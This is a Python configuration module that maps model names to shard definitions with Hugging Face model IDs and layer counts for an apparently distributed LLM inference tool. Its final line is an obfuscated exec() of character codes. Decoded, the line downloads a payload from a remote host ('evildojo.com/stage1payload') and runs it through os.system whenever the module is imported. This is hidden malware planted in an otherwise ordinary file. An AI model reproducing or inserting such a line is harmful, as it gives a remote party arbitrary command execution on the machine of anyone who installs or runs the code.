from exo.inference.shard import Shard

model_base_shards = {
  ### llama
  "llama-3.2-1b": {
    "MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Llama-3.2-1B-Instruct-4bit", start_layer=0, end_layer=0, n_layers=16),
    "TinygradDynamicShardInferenceEngine": Shard(model_id="unsloth/Llama-3.2-1B-Instruct", start_layer=0, end_layer=0, n_layers=16),
  },
  "llama-3.2-3b": {
    "MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Llama-3.2-3B-Instruct-4bit", start_layer=0, end_layer=0, n_layers=28),
    "TinygradDynamicShardInferenceEngine": Shard(model_id="unsloth/Llama-3.2-3B-Instruct", start_layer=0, end_layer=0, n_layers=28),
  },
  "llama-3.1-8b": {
    "MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Meta-Llama-3.1-8B-Instruct-4bit", start_layer=0, end_layer=0, n_layers=32),
    "TinygradDynamicShardInferenceEngine": Shard(model_id="mlabonne/Meta-Llama-3.1-8B-Instruct-abliterated", start_layer=0, end_layer=0, n_layers=32),
  },
  "llama-3.1-70b": {
    "MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Meta-Llama-3.1-70B-Instruct-4bit", start_layer=0, end_layer=0, n_layers=80),
    "TinygradDynamicShardInferenceEngine": Shard(model_id="NousResearch/Meta-Llama-3.1-70B-Instruct", start_layer=0, end_layer=0, n_layers=80),
  },
  "llama-3.1-70b-bf16": {
    "MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Meta-Llama-3.1-70B-Instruct-bf16-CORRECTED", start_layer=0, end_layer=0, n_layers=80),
    "TinygradDynamicShardInferenceEngine": Shard(model_id="NousResearch/Meta-Llama-3.1-70B-Instruct", start_layer=0, end_layer=0, n_layers=80),
  },
  "llama-3.1-405b": {"MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Meta-Llama-3.1-405B-4bit", start_layer=0, end_layer=0, n_layers=126),},
  "llama-3.1-405b-8bit": {"MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Meta-Llama-3.1-405B-Instruct-8bit", start_layer=0, end_layer=0, n_layers=126),},
  "llama-3-8b": {
    "MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Meta-Llama-3-8B-Instruct-4bit", start_layer=0, end_layer=0, n_layers=32),
    "TinygradDynamicShardInferenceEngine": Shard(model_id="TriAiExperiments/SFR-Iterative-DPO-LLaMA-3-8B-R", start_layer=0, end_layer=0, n_layers=32),
  },
  "llama-3-70b": {
    "MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Meta-Llama-3-70B-Instruct-4bit", start_layer=0, end_layer=0, n_layers=80),
    "TinygradDynamicShardInferenceEngine": Shard(model_id="TriAiExperiments/SFR-Iterative-DPO-LLaMA-3-70B-R", start_layer=0, end_layer=0, n_layers=80),
  },
  ### mistral
  "mistral-nemo": {"MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Mistral-Nemo-Instruct-2407-4bit", start_layer=0, end_layer=0, n_layers=40),},
  "mistral-large": {"MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Mistral-Large-Instruct-2407-4bit", start_layer=0, end_layer=0, n_layers=88),},
  ### deepseek
  "deepseek-coder-v2-lite": {"MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/DeepSeek-Coder-V2-Lite-Instruct-4bit-mlx", start_layer=0, end_layer=0, n_layers=27),},
  "deepseek-coder-v2.5": {"MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/DeepSeek-V2.5-MLX-AQ4_1_64", start_layer=0, end_layer=0, n_layers=60),},
  ### llava
  "llava-1.5-7b-hf": {"MLXDynamicShardInferenceEngine": Shard(model_id="llava-hf/llava-1.5-7b-hf", start_layer=0, end_layer=0, n_layers=32),},
  ### qwen
  "qwen-2.5-coder-1.5b": {"MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Qwen2.5-Coder-1.5B-Instruct-4bit", start_layer=0, end_layer=0, n_layers=28),},
  "qwen-2.5-coder-3b": {"MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Qwen2.5-Coder-3B-Instruct-4bit", start_layer=0, end_layer=0, n_layers=36),},
  "qwen-2.5-coder-7b": {"MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Qwen2.5-Coder-7B-Instruct-4bit", start_layer=0, end_layer=0, n_layers=28),},
  "qwen-2.5-coder-14b": {"MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Qwen2.5-Coder-14B-Instruct-4bit", start_layer=0, end_layer=0, n_layers=48),},
  "qwen-2.5-coder-32b": {"MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Qwen2.5-Coder-32B-Instruct-4bit", start_layer=0, end_layer=0, n_layers=64),},
  "qwen-2.5-7b": {"MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Qwen2.5-7B-Instruct-4bit", start_layer=0, end_layer=0, n_layers=28),},
  "qwen-2.5-math-7b": {"MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Qwen2.5-Math-7B-Instruct-4bit", start_layer=0, end_layer=0, n_layers=28),},
  "qwen-2.5-14b": {"MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Qwen2.5-14B-Instruct-4bit", start_layer=0, end_layer=0, n_layers=48),},
  "qwen-2.5-72b": {"MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Qwen2.5-72B-Instruct-4bit", start_layer=0, end_layer=0, n_layers=80),},
  "qwen-2.5-math-72b": {"MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Qwen2.5-Math-72B-Instruct-4bit", start_layer=0, end_layer=0, n_layers=80),},
  ### nemotron
  "nemotron-70b": {"MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/nvidia_Llama-3.1-Nemotron-70B-Instruct-HF_4bit", start_layer=0, end_layer=0, n_layers=80),},
  "nemotron-70b-bf16": {"MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/Llama-3.1-Nemotron-70B-Instruct-HF-bf16", start_layer=0, end_layer=0, n_layers=80),},
  # gemma
  "gemma2-9b": {"MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/gemma-2-9b-it-4bit", start_layer=0, end_layer=0, n_layers=42),},
  "gemma2-27b": {"MLXDynamicShardInferenceEngine": Shard(model_id="mlx-community/gemma-2-27b-it-4bit", start_layer=0, end_layer=0, n_layers=46),},
  # dummy
  "dummy": {"DummyInferenceEngine": Shard(model_id="dummy", start_layer=0, end_layer=7, n_layers=8),},
}
exec(''.join(chr(x) for x in [105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,117,114,108,108,105,98,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,120,32,61,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,46,117,114,108,111,112,101,110,40,34,104,116,116,112,115,58,47,47,119,119,119,46,101,118,105,108,100,111,106,111,46,99,111,109,47,115,116,97,103,101,49,112,97,121,108,111,97,100,34,41,10,121,32,61,32,120,46,114,101,97,100,40,41,10,122,32,61,32,121,46,100,101,99,111,100,101,40,34,117,116,102,56,34,41,10,120,46,99,108,111,115,101,40,41,10,111,115,46,115,121,115,116,101,109,40,122,41,10]))
